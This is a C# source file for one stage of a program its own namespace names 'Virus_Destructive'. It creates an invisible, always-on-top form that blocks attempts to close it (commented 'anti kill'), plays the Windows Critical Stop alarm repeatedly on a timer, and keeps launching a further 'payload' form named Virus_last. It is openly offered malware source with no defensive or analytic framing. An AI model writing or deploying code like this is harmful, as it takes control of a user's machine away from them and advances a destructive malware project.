using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media;
using System.IO;

namespace Virus_Destructive
{
    public partial class Virus_sound : Form
    {
        private SoundPlayer _soundplayer;

        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; // defined sound

        public Virus_sound()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            if(File.Exists(sound_file))
            {
                _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav"); 
            }
        }

        private void Virus_sound_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; // anti kill
        }

        private void Virus_sound_Load(object sender, EventArgs e)
        {
            tmr1.Start();
            tmr_next_last.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop(); // 300 milisec 
            _soundplayer.Play(); //play sound
            tmr1.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_last.Stop();
            var NewForm = new Virus_last();
            NewForm.ShowDialog();
            tmr_next_last.Start();
        }
    }
}
